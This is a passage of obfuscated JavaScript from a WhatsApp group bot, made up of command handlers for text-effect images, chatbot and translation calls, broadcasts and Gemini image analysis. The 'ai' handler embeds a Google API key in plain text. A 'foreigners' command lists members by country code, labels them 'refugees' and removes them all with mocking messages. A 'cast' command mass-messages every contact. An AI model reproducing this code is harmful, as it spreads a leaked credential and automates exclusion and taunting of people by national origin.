              _0xca7ad5.reply("Example usage: " + prefix + "Light myself");
              return;
            }
            try {
              var _0x28347b = await _0x15f987.ephoto('https://en.ephoto360.com/light-text-effect-futuristic-technology-style-648.html', _0x32c5b4);
              _0xca7ad5.reply("*Wait a moment...*");
              await _0x398b1a.sendMessage(_0xca7ad5.chat, {
                'image': {
                  'url': _0x28347b.image
                },
                'caption': "GENERATED BY 𝗩𝗜𝗡𝗜𝗭𝗜𝗔𝗭-𝗫𝗠𝗗"
              }, {
                'quoted': _0xca7ad5
              });
            } catch (_0x6f079d) {
              _0xca7ad5.reply('💀💀' + _0x6f079d);
            }
          }
          break;
        case 'neon':
          {
            var _0x15f987 = require('mumaker');
            if (!_0x32c5b4 || _0x32c5b4 == '') {
              _0xca7ad5.reply("Example Usage : " + prefix + "Neon Viniziaz");
              return;
            }
            try {
              var _0x20e746 = await _0x15f987.ephoto('https://en.ephoto360.com/create-colorful-neon-light-text-effects-online-797.html', _0x32c5b4);
              _0xca7ad5.reply("*Wait a moment...*");
              await _0x398b1a.sendMessage(_0xca7ad5.chat, {
                'image': {
                  'url': _0x20e746.image
                },
                'caption': "GENERATED BY 𝗩𝗜𝗡𝗜𝗭𝗜𝗔𝗭-𝗫𝗠𝗗"
              });
            } catch (_0x5875c6) {
              _0xca7ad5.reply(_0x5875c6);
            }
          }
          break;
        case 'silver':
        case "silva":
          {
            var _0x15f987 = require("mumaker");
            if (!_0x32c5b4 || _0x32c5b4 == " ") {
              _0xca7ad5.reply("Example Usage : " + prefix + "Silva Viniziaz");
              return;
            }
            try {
              var _0x96dd45 = await _0x15f987.ephoto('https://en.ephoto360.com/create-glossy-silver-3d-text-effect-online-802.html', _0x32c5b4);
              _0xca7ad5.reply("*Wait a moment...*");
              await _0x398b1a.sendMessage(_0xca7ad5.chat, {
                'image': {
                  'url': _0x96dd45.image
                },
                'caption': "GENERATED BY 𝗩𝗜𝗡𝗜𝗭𝗜𝗔𝗭-𝗫𝗠𝗗"
              });
            } catch (_0x55a5ca) {
              _0xca7ad5.reply(_0x55a5ca);
            }
          }
          break;
        case "devil":
          {
            var _0x15f987 = require('mumaker');
            if (!_0x32c5b4 || _0x32c5b4 == '') {
              _0xca7ad5.reply("Example Usage : " + prefix + "Devil Viniziaz");
              return;
            }
            try {
              var _0x2411fb = await _0x15f987.ephoto("https://en.ephoto360.com/neon-devil-wings-text-effect-online-683.html", _0x32c5b4);
              _0xca7ad5.reply("*Wait a moment...*");
              await _0x398b1a.sendMessage(_0xca7ad5.chat, {
                'image': {
                  'url': _0x2411fb.image
                },
                'caption': "GENERATED BY 𝗩𝗜𝗡𝗜𝗭𝗜𝗔𝗭-𝗫𝗠𝗗"
              });
            } catch (_0xb47d43) {
              _0xca7ad5.reply(_0xb47d43);
            }
          }
          break;
        case "typography":
          {
            var _0x15f987 = require("mumaker");
            if (!_0x32c5b4 || _0x32c5b4 == '') {
              _0xca7ad5.reply("Example Usage : " + prefix + "Typography Viniziaz");
              return;
            }
            try {
              var _0x5a38d7 = await _0x15f987.ephoto("https://en.ephoto360.com/create-typography-text-effect-on-pavement-online-774.html", _0x32c5b4);
              _0xca7ad5.reply("*Wait a moment...*");
              await _0x398b1a.sendMessage(_0xca7ad5.chat, {
                'image': {
                  'url': _0x5a38d7.image
                },
                'caption': "GENERATED BY 𝗩𝗜𝗡𝗜𝗭𝗜𝗔𝗭-𝗫𝗠𝗗"
              });
            } catch (_0xd98682) {
              _0xca7ad5.reply(_0xd98682);
            }
          }
          break;
        case "purple":
          {
            var _0x15f987 = require('mumaker');
            if (!_0x32c5b4 || _0x32c5b4 == '') {
              _0xca7ad5.reply("Example Usage : " + prefix + "purple Viniziaz");
              return;
            }
            try {
              var _0x595a98 = await _0x15f987.ephoto("https://en.ephoto360.com/purple-text-effect-online-100.html", _0x32c5b4);
              _0xca7ad5.reply("*Wait a moment...*");
              await _0x398b1a.sendMessage(_0xca7ad5.chat, {
                'image': {
                  'url': _0x595a98.image
                },
                'caption': "GENERATED BY 𝗩𝗜𝗡𝗜𝗭𝗜𝗔𝗭-𝗫𝗠𝗗"
              });
            } catch (_0x440c86) {
              _0xca7ad5.reply(_0x440c86);
            }
          }
          break;
        case "thunder":
          {
            var _0x15f987 = require('mumaker');
            if (!_0x32c5b4 || _0x32c5b4 == '') {
              _0xca7ad5.reply("Example Usage : " + prefix + "Thunder Viniziaz");
              return;
            }
            try {
              var _0x1dbd4b = await _0x15f987.ephoto("https://en.ephoto360.com/thunder-text-effect-online-97.html", _0x32c5b4);
              _0xca7ad5.reply("*Wait a moment...*");
              await _0x398b1a.sendMessage(_0xca7ad5.chat, {
                'image': {
                  'url': _0x1dbd4b.image
                },
                'caption': "GENERATED BY 𝗩𝗜𝗡𝗜𝗭𝗜𝗔𝗭-𝗫𝗠𝗗"
              });
            } catch (_0x50c21e) {
              _0xca7ad5.reply(_0x50c21e);
            }
          }
          break;
        case "leaves":
          {
            var _0x15f987 = require("mumaker");
            if (!_0x32c5b4 || _0x32c5b4 == '') {
              _0xca7ad5.reply("Example Usage : " + prefix + "Leaves RAVEN-BOT");
              return;
            }
            try {
              var _0x2ae67f = await _0x15f987.ephoto('https://en.ephoto360.com/green-brush-text-effect-typography-maker-online-153.html', _0x32c5b4);
              _0xca7ad5.reply("Wait a moment...");
              await _0x398b1a.sendMessage(_0xca7ad5.chat, {
                'image': {
                  'url': _0x2ae67f.image
                },
                'caption': "GENERATED BY 𝗩𝗜𝗡𝗜𝗭𝗜𝗔𝗭-𝗫𝗠𝗗"
              }, {
                'quoted': _0xca7ad5
              });
            } catch (_0x1136d2) {
              _0xca7ad5.reply(_0x1136d2);
            }
          }
          break;
        case "1917":
          {
            var _0x15f987 = require("mumaker");
            if (!_0x32c5b4 || _0x32c5b4 == '') {
              _0xca7ad5.reply("Example Usage : " + prefix + "1917 Viniziaz");
              return;
            }
            try {
              var _0x49b20e = await _0x15f987.ephoto("https://en.ephoto360.com/1917-style-text-effect-523.html", _0x32c5b4);
              _0xca7ad5.reply("Wait a moment...");
              await _0x398b1a.sendMessage(_0xca7ad5.chat, {
                'image': {
                  'url': _0x49b20e.image
                },
                'caption': "GENERATED BY 𝗩𝗜𝗡𝗜𝗭𝗜𝗔𝗭-𝗫𝗠𝗗"
              }, {
                'quoted': _0xca7ad5
              });
            } catch (_0x4b8243) {
              _0xca7ad5.reply(_0x4b8243);
            }
          }
          break;
        case "arena":
          {
            var _0x15f987 = require('mumaker');
            if (!_0x32c5b4 || _0x32c5b4 == '') {
              _0xca7ad5.reply("Example Usage : " + prefix + "arena VINIZIAZ-XMD");
              return;
            }
            try {
              var _0x471f77 = await _0x15f987.ephoto("https://en.ephoto360.com/create-cover-arena-of-valor-by-mastering-360.html", _0x32c5b4);
              _0xca7ad5.reply("Wait a moment...");
              await _0x398b1a.sendMessage(_0xca7ad5.chat, {
                'image': {
                  'url': _0x471f77.image
                },
                'caption': "GENERATED BY 𝗩𝗜𝗡𝗜𝗭𝗜𝗔𝗭-𝗫𝗠𝗗"
              }, {
                'quoted': _0xca7ad5
              });
            } catch (_0x5845d7) {
              _0xca7ad5.reply(_0x5845d7);
            }
          }
          break;
        case 'hacker':
          {
            var _0x15f987 = require('mumaker');
            if (!_0x32c5b4 || _0x32c5b4 == '') {
              _0xca7ad5.reply("Example usage :  " + prefix + "hacker Viniziaz");
              return;
            }
            try {
              let _0x50515c = await _0x15f987.ephoto("https://en.ephoto360.com/create-anonymous-hacker-avatars-cyan-neon-677.html", _0x32c5b4);
              _0xca7ad5.reply("*Wait a moment...*");
              await _0x398b1a.sendMessage(_0xca7ad5.chat, {
                'image': {
                  'url': _0x50515c.image
                },
                'caption': "GENERATED BY 𝗩𝗜𝗡𝗜𝗭𝗜𝗔𝗭-𝗫𝗠𝗗"
              }, {
                'quoted': _0xca7ad5
              });
            } catch (_0x290e92) {
              _0xca7ad5.reply("🥵🥵 " + _0x290e92);
            }
          }
          break;
        case "sand":
          {
            var _0x15f987 = require("mumaker");
            if (!_0x32c5b4 || _0x32c5b4 == '') {
              _0xca7ad5.reply("Example Usage : " + prefix + "sand Raven");
              return;
            }
            try {
              let _0x24f4c1 = await _0x15f987.ephoto("https://en.ephoto360.com/write-names-and-messages-on-the-sand-online-582.html", _0x32c5b4);
              _0xca7ad5.reply("*Wait a moment...*");
              await _0x398b1a.sendMessage(_0xca7ad5.chat, {
                'image': {
                  'url': _0x24f4c1.image
                },
                'caption': "GENERATED BY 𝗩𝗜𝗡𝗜𝗭𝗜𝗔𝗭-𝗫𝗠𝗗"
              }, {
                'quoted': _0xca7ad5
              });
            } catch (_0x11661a) {
              _0xca7ad5.reply("🚫🚫 " + _0x11661a);
            }
          }
          break;
        case "dragonball":
          {
            var _0x15f987 = require("mumaker");
            if (!_0x32c5b4 || _0x32c5b4 == '') {
              _0xca7ad5.reply("Example usage :  " + prefix + "dragonball Viniziaz");
              return;
            }
            try {
              const _0x318c57 = await _0x15f987.ephoto('https://en.ephoto360.com/create-dragon-ball-style-text-effects-online-809.html', _0x32c5b4);
              _0xca7ad5.reply("*Wait a moment...*");
              await _0x398b1a.sendMessage(_0xca7ad5.chat, {
                'image': {
                  'url': _0x318c57.image
                },
                'caption': "GENERATED BY 𝗩𝗜𝗡𝗜𝗭𝗜𝗔𝗭-𝗫𝗠𝗗"
              }, {
                'quoted': _0xca7ad5
              });
            } catch (_0x32087a) {
              _0xca7ad5.reply("🥵🥵 " + _0x32087a);
            }
          }
          break;
        case "naruto":
          {
            var _0x15f987 = require("mumaker");
            if (!_0x32c5b4 || _0x32c5b4 == '') {
              _0xca7ad5.reply("Example usage : " + prefix + "naruto Viniziaz");
              return;
            }
            try {
              var _0x25cd7a = await _0x15f987.ephoto("https://en.ephoto360.com/naruto-shippuden-logo-style-text-effect-online-808.html", _0x32c5b4);
              _0xca7ad5.reply("*Wait a moment...*");
              await _0x398b1a.sendMessage(_0xca7ad5.chat, {
                'image': {
                  'url': _0x25cd7a.image
                },
                'caption': "GENERATED BY 𝗩𝗜𝗡𝗜𝗭𝗜𝗔𝗭-𝗫𝗠𝗗"
              }, {
                'quoted': _0xca7ad5
              });
            } catch (_0x21aa11) {
              _0xca7ad5.reply("🥵🥵 " + _0x21aa11);
            }
          }
          break;
        case "graffiti":
          {
            var _0x15f987 = require("mumaker");
            if (!_0x32c5b4 || _0x32c5b4 == '') {
              _0xca7ad5.reply("Example usage : " + prefix + "graffiti Viniziaz");
              return;
            }
            try {
              let _0x1980fc = await _0x15f987.ephoto("https://en.ephoto360.com/create-a-cartoon-style-graffiti-text-effect-online-668.html", _0x32c5b4);
              _0xca7ad5.reply("*Wait a moment...*");
              await _0x398b1a.sendMessage(_0xca7ad5.chat, {
                'image': {
                  'url': _0x1980fc.image
                },
                'caption': "GENERATED BY 𝗩𝗜𝗡𝗜𝗭𝗜𝗔𝗭-𝗫𝗠𝗗"
              }, {
                'quoted': _0xca7ad5
              });
            } catch (_0x3ad2bb) {
              _0xca7ad5.reply("🥵🥵 " + _0x3ad2bb);
            }
          }
          break;
        case "cat":
          {
            var _0x15f987 = require("mumaker");
            if (!_0x32c5b4 || _0x32c5b4 == '') {
              _0xca7ad5.reply("Example usage : * " + prefix + "cat Viniziaz");
              return;
            }
            try {
              let _0x2620c2 = await _0x15f987.ephoto("https://en.ephoto360.com/handwritten-text-on-foggy-glass-online-680.html", _0x32c5b4);
              _0xca7ad5.reply("*Wait a moment...*");
              await _0x398b1a.sendMessage(_0xca7ad5.chat, {
                'image': {
                  'url': _0x2620c2.image
                },
                'caption': "GENERATED BY 𝗩𝗜𝗡𝗜𝗭𝗜𝗔𝗭-𝗫𝗠𝗗"
              }, {
                'quoted': _0xca7ad5
              });
            } catch (_0x12dfdb) {
              _0xca7ad5.reply("🥵🥵 " + _0x12dfdb);
            }
          }
          break;
        case "gold":
          {
            var _0x15f987 = require("mumaker");
            if (!_0x32c5b4 || _0x32c5b4 == '') {
              _0xca7ad5.reply("Example usage: " + prefix + "Gold myself");
              return;
            }
            try {
              var _0x17d2a4 = await _0x15f987.ephoto('https://en.ephoto360.com/modern-gold-4-213.html', _0x32c5b4);
              _0xca7ad5.reply("*Wait a moment...*");
              await _0x398b1a.sendMessage(_0xca7ad5.chat, {
                'image': {
                  'url': _0x17d2a4.image
                },
                'caption': "GENERATED BY RAVEN-BOT"
              }, {
                'quoted': _0xca7ad5
              });
            } catch (_0x29350f) {
              _0xca7ad5.reply("💀💀" + _0x29350f);
            }
          }
          break;
        case "child":
          {
            var _0x15f987 = require("mumaker");
            if (!_0x32c5b4 || _0x32c5b4 == '') {
              _0xca7ad5.reply("Example usage: " + prefix + "Child Viniziaz");
              return;
            }
            try {
              var _0x4674d3 = await _0x15f987.ephoto("https://en.ephoto360.com/write-text-on-wet-glass-online-589.html", _0x32c5b4);
              _0xca7ad5.reply("*Wait a moment...*");
              await _0x398b1a.sendMessage(_0xca7ad5.chat, {
                'image': {
                  'url': _0x4674d3.image
                },
                'caption': "GENERATED BY 𝗩𝗜𝗡𝗜𝗭𝗜𝗔𝗭-𝗫𝗠𝗗"
              }, {
                'quoted': _0xca7ad5
              });
            } catch (_0x9d7bc6) {
              _0xca7ad5.reply('💀💀' + _0x9d7bc6);
            }
          }
          break;
        case "Dommie":
          {
            if (!_0x32c5b4) {
              return _0x1d37a1("Hello I'm 𝗩𝗜𝗡𝗜𝗭𝗜𝗔𝗭-𝗫𝗠𝗗 𝗔𝗜. How can i help u?");
            }
            let _0x3643b4 = await fetchJson("https://bk9.fun/ai/llama?q=" + _0x32c5b4);
            if (!_0x3643b4.BK9) {
              return _0x1d37a1("An error occurred while fetching the AI chatbot response. Please try again later.");
            } else {
              _0x1d37a1(_0x3643b4.BK9);
            }
          }
          break;
        case "gpt2":
          {
            if (!_0x32c5b4) {
              return _0x1d37a1("What's your question ?");
            }
            let _0xbe481f = await fetchJson("https://bk9.fun/ai/jeeves-chat?q=" + _0x32c5b4);
            if (!_0xbe481f.BK9) {
              return _0x1d37a1("An error occurred while fetching the AI chatbot response. Please try again later.");
            } else {
              _0x1d37a1(_0xbe481f.BK9);
            }
          }
          break;
        case "trt":
        case "translate":
          {
            try {
              const _0x3a257c = _0x32c5b4.split(" ");
              if (_0x3a257c.length < 0x2) {
                return _0xca7ad5.reply(" Please provide a language code and text to translate !");
              }
              const _0x3e0500 = _0x3a257c[0x0];
              const _0x27a754 = _0x3a257c.slice(0x1).join(" ");
              const _0x387818 = await fetch("https://api.mymemory.translated.net/get?q=" + encodeURIComponent(_0x27a754) + '&langpair=en|' + _0x3e0500);
              if (!_0x387818.ok) {
                return _0xca7ad5.reply("Failed to fetch data. Please try again later.");
              }
              const _0x1473ea = await _0x387818.json();
              if (!_0x1473ea.responseData || !_0x1473ea.responseData.translatedText) {
                return _0xca7ad5.reply("No translation found for the provided text.");
              }
              const _0x1e6b07 = _0x1473ea.responseData.translatedText;
              const _0x3ff199 = " " + _0x1e6b07;
              await _0x398b1a.sendMessage(_0xca7ad5.chat, {
                'text': _0x3ff199
              }, {
                'quoted': _0xca7ad5
              });
            } catch (_0x3e64f6) {
              console.error("Error occurred:", _0x3e64f6);
              _0xca7ad5.reply("An error occurred while fetching the data. Please try again later.\n" + _0x3e64f6);
            }
          }
          break;
        case "antidelete":
          {
            try {
              if (!_0xca7ad5.isGroup) {
                return _0xca7ad5.reply("This feature is only for groups!");
              }
              let _0x551444 = _0xca7ad5.chat;
              let _0x49686c = global.antiDeleteGroups?.["includes"](_0x551444);
              if (_0x4dd883[0x0] === 'on') {
                if (_0x49686c) {
                  return _0xca7ad5.reply("Anti-Delete is already enabled!");
                }
                global.antiDeleteGroups.push(_0x551444);
                _0xca7ad5.reply("✅ Anti-Delete has been enabled!");
              } else {
                if (_0x4dd883[0x0] === 'off') {
                  if (!_0x49686c) {
                    return _0xca7ad5.reply("Anti-Delete is already disabled!");
                  }
                  global.antiDeleteGroups = global.antiDeleteGroups.filter(_0x56b7d5 => _0x56b7d5 !== _0x551444);
                  _0xca7ad5.reply("❌ Anti-Delete has been disabled!");
                } else {
                  _0xca7ad5.reply("Usage: *antidelete on* or *antidelete off*");
                }
              }
            } catch (_0x347e94) {
              console.error("Error in Anti-Delete:", _0x347e94);
              _0xca7ad5.reply("An error occurred while processing your request.");
            }
          }
          break;
        case "cast":
          {
            if (!_0x11f3a8) {
              throw NotOwner;
            }
            if (!_0xca7ad5.isGroup) {
              throw group;
            }
            if (!_0x32c5b4) {
              return _0xca7ad5.reply("provide a text to cast !");
            }
            let _0x10d0af = await _0x35f297.filter(_0x2e7dba => _0x2e7dba.id.endsWith('.net')).map(_0x656689 => _0x656689.id);
            _0xca7ad5.reply("Success in casting the message to contacts\n\nDo not always use this Command to avoid WA-bans ! ");
            for (let _0x31a5ee of _0x10d0af) {
              _0x398b1a.sendMessage(_0x31a5ee, {
                'text': q
              });
            }
            _0xca7ad5.reply("Casting completed successfully😁");
          }
          break;
        case "img":
        case "ai-img":
        case "image":
        case "images":
          {
            var _0x577888 = require("g-i-s");
            if (!_0x32c5b4) {
              return _0xca7ad5.reply("Provide a text");
            }
            try {
              _0x577888(_0x32c5b4, async (_0x1fc672, _0x2abb1f) => {
                if (_0x1fc672) {
                  return _0xca7ad5.reply("An error occurred while searching for images.\n" + _0x1fc672);
                }
                if (_0x2abb1f.length === 0x0) {
                  return _0xca7ad5.reply("No images found.");
                }
                const _0x1f4dca = Math.min(_0x2abb1f.length, 0x5);
                const _0x50b22e = _0x2abb1f.slice(0x0, _0x1f4dca).map(_0x22ec8 => _0x22ec8.url);
                const _0x3bee84 = _0x50b22e.map(_0x46cfd5 => ({
                  'image': {
                    'url': _0x46cfd5
                  },
                  'caption': "Downloaded by " + botname
                }));
                for (const _0x3c99f2 of _0x3bee84) {
                  await _0x398b1a.sendMessage(_0xca7ad5.chat, _0x3c99f2, {
                    'quoted': _0xca7ad5
                  });
                }
              });
            } catch (_0x6ce61d) {
              _0xca7ad5.reply("An error occurred.\n" + _0x6ce61d);
            }
          }
          break;
        case "foreigners":
          {
            if (!_0xca7ad5.isGroup) {
              throw group;
            }
            if (!_0x396ea3) {
              throw admin;
            }
            if (!_0x59fea5) {
              throw botAdmin;
            }
            let _0x47d55e = _0x35f297.filter(_0x3720ba => !_0x3720ba.admin).map(_0xf04211 => _0xf04211.id).filter(_0x4be0f3 => !_0x4be0f3.startsWith(mycode) && _0x4be0f3 != _0x398b1a.decodeJid(_0x398b1a.user.id));
            if (!_0x4dd883 || !_0x4dd883[0x0]) {
              if (_0x47d55e.length == 0x0) {
                return _0xca7ad5.reply("No foreigners detected.");
              }
              let _0x5578a9 = "𝑭𝒐𝒓𝒆𝒊𝒈𝒏𝒆𝒓𝒔 𝒂𝒓𝒆 𝒕𝒉𝒐𝒔𝒆 𝒈𝒖𝒚𝒔 𝒘𝒉𝒐𝒔𝒆 𝒄𝒐𝒖𝒏𝒕𝒓𝒚 𝒄𝒐𝒅𝒆 𝒊𝒔 𝒏𝒐𝒕 " + mycode + ". 𝑻𝒉𝒆 𝒇𝒐𝒍𝒍𝒐𝒘𝒊𝒏𝒈 𝒓𝒆𝒇𝒖𝒈𝒆𝒆𝒔  " + _0x47d55e.length + " 𝒐𝒓 𝒇𝒐𝒓𝒆𝒊𝒈𝒏𝒆𝒓𝒔 𝒘𝒆𝒓𝒆 𝒅𝒆𝒕𝒆𝒄𝒕𝒆𝒅:- \n";
              for (let _0x274b07 of _0x47d55e) {
                _0x5578a9 += "𓅂 @" + _0x274b07.split('@')[0x0] + "\n";
              }
              _0x5578a9 += "\n𝑻𝒐 𝒓𝒆𝒎𝒐𝒗𝒆 𝒕𝒉𝒆𝒎 𝒔𝒆𝒏𝒅 foreigners -x";
              _0x398b1a.sendMessage(_0xca7ad5.chat, {
                'text': _0x5578a9,
                'mentions': _0x47d55e
              }, {
                'quoted': _0xca7ad5
              });
            } else if (_0x4dd883[0x0] == '-x') {
              setTimeout(() => {
                _0x398b1a.sendMessage(_0xca7ad5.chat, {
                  'text': "𝑴𝒛𝒂𝒛𝒊 𝒘𝒊𝒍𝒍 𝒏𝒐𝒘 𝒓𝒆𝒎𝒐𝒗𝒆 𝒂𝒍𝒍 " + _0x47d55e.length + " 𝒇𝒐𝒓𝒆𝒊𝒈𝒏𝒆𝒓𝒔/𝒓𝒆𝒇𝒖𝒈𝒆𝒆𝒔 𝒇𝒓𝒐𝒎 𝒕𝒉𝒊𝒔 𝒈𝒓𝒐𝒖𝒑 𝒄𝒉𝒂𝒕 𝒊𝒏 𝒕𝒉𝒆 𝒏𝒆𝒙𝒕 𝒔𝒆𝒄𝒐𝒏𝒅.\n\n𝒈𝒐𝒐𝒅𝒃𝒚𝒆. 𝑻𝒉𝒊𝒔 𝒑𝒓𝒐𝒄𝒆𝒔𝒔 𝒄𝒂𝒏 𝒏𝒐𝒕 𝒃𝒆 𝒕𝒆𝒓𝒎𝒊𝒏𝒂𝒕𝒆𝒅😂⚠️\n\n> ©𝖕𝖔𝖜𝖊𝖗𝖊𝖉 𝖇𝖞 𝗩𝗜𝗡𝗜𝗭𝗜𝗔𝗭-𝗫𝗠𝗗"
                }, {
                  'quoted': _0xca7ad5
                });
                setTimeout(() => {
                  _0x398b1a.groupParticipantsUpdate(_0xca7ad5.chat, _0x47d55e, 'remove');
                  setTimeout(() => {
                    _0xca7ad5.reply("𝑨𝒏𝒚 𝒓𝒆𝒎𝒂𝒊𝒏𝒊𝒏𝒈 𝒇𝒐𝒓𝒆𝒊𝒈𝒏𝒆𝒓, 𝒓𝒂𝒊𝒔𝒆 𝒚𝒐𝒖𝒓 𝒉𝒂𝒏𝒅𝒔?🌚😂.");
                  }, 0x3e8);
                }, 0x3e8);
              }, 0x3e8);
            }
          }
          break;
        case "dalle":
        case "createimage":
          {
            if (!_0x32c5b4) {
              return _0xca7ad5.reply("*𝑻𝒉𝒊𝒔 𝒄𝒐𝒎𝒎𝒂𝒏𝒅 𝒈𝒆𝒏𝒆𝒓𝒂𝒕𝒆𝒔 𝒊𝒎𝒂𝒈𝒆𝒔 𝒇𝒓𝒐𝒎 𝒕𝒆𝒙𝒕 𝒑𝒓𝒐𝒎𝒑𝒕𝒔*\n\n*𝑬𝒙𝒂𝒎𝒑𝒍𝒆 𝒖𝒔𝒂𝒈𝒆*\n*" + (prefix + _0x3418f9) + " 𝑩𝒆𝒂𝒖𝒕𝒊𝒇𝒖𝒍 𝒂𝒏𝒊𝒎𝒆 𝒈𝒊𝒓𝒍*\n*" + (prefix + _0x3418f9) + " 𝒈𝒊𝒓𝒍 𝒊𝒏 𝒑𝒊𝒏𝒌 𝒅𝒓𝒆𝒔𝒔*");
            }
            try {
              _0xca7ad5.reply("𝒑𝒍𝒆𝒂𝒔𝒆 𝒘𝒂𝒊𝒕, 𝒂𝒎 𝒈𝒆𝒏𝒆𝒓𝒂𝒕𝒊𝒏𝒈 𝒚𝒐𝒖𝒓 𝒊𝒎𝒂𝒈𝒆...");
              const _0x2c8ed7 = "https://cute-tan-gorilla-yoke.cyclic.app/imagine?text=" + encodeURIComponent(_0x32c5b4);
              const _0x5b95d5 = await fetch(_0x2c8ed7);
              if (_0x5b95d5.ok) {
                const _0x14028b = await _0x5b95d5.buffer();
                await _0x398b1a.sendMessage(_0xca7ad5.chat, {
                  'image': _0x14028b
                }, {
                  'quoted': _0xca7ad5
                });
              } else {
                throw "*𝒂𝒂𝒉𝒉𝒉𝒓𝒈 𝒈𝒆𝒏𝒆𝒓𝒂𝒕𝒊𝒐𝒏 𝒇𝒂𝒊𝒍𝒆𝒅*\n\n© >𝖕𝖔𝖜𝖊𝖗𝖊𝖉 𝖇𝖞 𝗩𝗜𝗡𝗜𝗭𝗜𝗔𝗭-𝗫𝗠𝗗";
              }
            } catch {
              _0xca7ad5.reply("𝑶𝒐𝒑𝒔! 𝒔𝒐𝒎𝒆𝒕𝒉𝒊𝒏𝒈 𝒘𝒆𝒏𝒕 𝒘𝒓𝒐𝒏𝒈 𝒘𝒉𝒊𝒍𝒆 𝒈𝒆𝒏𝒆𝒓𝒂𝒕𝒊𝒏𝒈 𝒚𝒐𝒖𝒓 𝒊𝒎𝒂𝒈𝒆. 𝑷𝒍𝒆𝒂𝒔𝒆 𝒕𝒓𝒚 𝒂𝒈𝒂𝒊𝒏 𝒍𝒂𝒕𝒆𝒓, 𝑴𝒁𝑨𝒁𝑰 𝒊𝒔 𝒇𝒐𝒓 𝒚𝒐𝒖😂.\n\n> ©𝖕𝖔𝖜𝖊𝖗𝖊𝖉 𝖇𝖞 𝗩𝗜𝗡𝗜𝗭𝗜𝗔𝗭-𝗫𝗠𝗗");
            }
          }
          break;
        case 'ai':
          {
            const {
              GoogleGenerativeAI: _0x38050e
            } = require("@google/generative-ai");
            const _0x45bf26 = require('axios');
            try {
              if (!_0xca7ad5.quoted) {
                return _0xca7ad5.reply("𝗤𝘂𝗼𝘁𝗲 𝗮𝗻 𝗶𝗺𝗮𝗴𝗲 𝘄𝗶𝘁𝗵 𝘁𝗵𝗲 𝗶𝗻𝘀𝘁𝗿𝘂𝗰𝘁𝗶𝗼𝗻𝘀 𝗲𝗵!");
              }
              if (!_0x32c5b4) {
                return _0xca7ad5.reply("𝗣𝗿𝗼𝘃𝗶𝗱𝗲 𝘀𝗼𝗺𝗲 𝗶𝗻𝘀𝘁𝗿𝘂𝗰𝘁𝗶𝗼𝗻𝘀 𝗲𝗵! 𝗧𝗵𝗶𝘀 𝗶𝘀 𝗩𝗜𝗡𝗜𝗭𝗜𝗔𝗭-𝗫𝗠𝗗 𝗔𝗶, 𝘂𝘀𝗶𝗻𝗴 𝗴𝗲𝗺𝗶𝗻𝗶-𝗽𝗿𝗼-𝘃𝗶𝘀𝗶𝗼𝗻 𝘁𝗼 𝗮𝗻𝗮𝗹𝘆𝘀𝗲 𝗶𝗺𝗮𝗴𝗲𝘀.");
              }
              if (!/image/.test(_0x372f6b)) {
                return _0xca7ad5.reply("𝗛𝘂𝗵 𝘁𝗵𝗶𝘀 𝗶𝘀 𝗻𝗼𝘁 𝗮𝗻 𝗶𝗺𝗮𝗴𝗲! 𝗣𝗹𝗲𝗮𝘀𝗲 𝗧𝗮𝗴 𝗮𝗻 𝗶𝗺𝗮𝗴𝗲 𝘄𝗶𝘁𝗵 𝘁𝗵𝗲 𝗶𝗻𝘀𝘁𝗿𝘂𝗰𝘁𝗶𝗼𝗻𝘀 𝗲𝗵 !");
              }
              let _0x55492d = await _0x398b1a.downloadAndSaveMediaMessage(_0xca7ad5.quoted);
              let _0x557d78 = await uploadtoimgur(_0x55492d);
              _0xca7ad5.reply("𝗔 𝗺𝗼𝗺𝗲𝘁, 𝗹𝗲𝗺𝗺𝗲 𝗮𝗻𝗮𝗹𝘆𝘀𝗲 𝘁𝗵𝗲 𝗰𝗼𝗻𝘁𝗲𝗻𝘁𝘀 𝗼𝗳 𝘁𝗵𝗲 𝗜𝗺𝗮𝗴𝗲...");
              const _0x77250a = new _0x38050e("AIzaSyDJUtskTG-MvQdlT4tNE319zBqLMFei8nQ");
              async function _0x1b567e(_0x518c68, _0x5f4d6d) {
                const _0x5c07f5 = {
                  'responseType': "arraybuffer"
                };
                const _0x3f45a5 = await _0x45bf26.get(_0x518c68, _0x5c07f5);
                const _0x4119b0 = Buffer.from(_0x3f45a5.data).toString("base64");
                const _0x403b9d = {
                  'data': _0x4119b0,
                  'mimeType': _0x5f4d6d
                };
                const _0x369bf4 = {
                  'inlineData': _0x403b9d
                };
                return _0x369bf4;
              }
              const _0xc1865e = {
                'model': "gemini-1.5-flash"
              };
              const _0x3b479b = _0x77250a.getGenerativeModel(_0xc1865e);
              const _0x1fb65b = [await _0x1b567e(_0x557d78, "image/jpeg")];
              const _0x156e8c = await _0x3b479b.generateContent([_0x32c5b4, ..._0x1fb65b]);
              const _0x6339e9 = await _0x156e8c.response;
              const _0x10c4f8 = _0x6339e9.text();
              await _0xca7ad5.reply(_0x10c4f8);
            } catch (_0x2904ec) {
              _0xca7ad5.reply("I am unable to analyze images at the moment\n" + _0x2904ec);
            }
          }
          break;
        case "ai2":
          {
            try {
              if (!_0xca7ad5.quoted) {
                return _0xca7ad5.reply("Send the image then tag it with the instruction.");
              }
              if (!_0x32c5b4) {
                return _0xca7ad5.reply("𝗣𝗿𝗼𝘃𝗶𝗱𝗲 𝘀𝗼𝗺𝗲 𝗶𝗻𝘀𝘁𝗿𝘂𝗰𝘁𝗶𝗼𝗻𝘀 𝗲𝗵! 𝗧𝗵𝗶𝘀 Viniziaz AI 𝗨𝘀𝗲 𝗚𝗲𝗺𝗶𝗻𝗶-𝗽𝗿𝗼-𝘃𝗶𝘀𝗶𝗼𝗻 𝘁𝗼 𝗮𝗻𝗮𝗹𝘆𝘀𝗲 𝗶𝗺𝗮𝗴𝗲𝘀.");
              }
              if (!/image/.test(_0x372f6b)) {
                return _0xca7ad5.reply("That is not an image, try again while quoting an actual image.");
              }
              let _0x1def91 = await _0x398b1a.downloadAndSaveMediaMessage(_0xca7ad5.quoted);
              let _0x1ee1cf = await uploadtoimgur(_0x1def91);
              _0xca7ad5.reply("𝗔 𝗠𝗼𝗺𝗲𝗻𝘁, 𝗩𝗜𝗡𝗜𝗭𝗜𝗔𝗭-𝗫𝗠𝗗[𝗩𝗜𝗡𝗜𝗭𝗜𝗔𝗭-𝗔𝗜] 𝗶𝘀 𝗮𝗻𝗮𝗹𝘆𝘇𝗶𝗻𝗴 𝘁𝗵𝗲 𝗰𝗼𝗻𝘁𝗲𝗻𝘁𝘀 𝗼𝗳 𝘁𝗵𝗲 𝗶𝗺𝗮𝗴𝗲. . .");
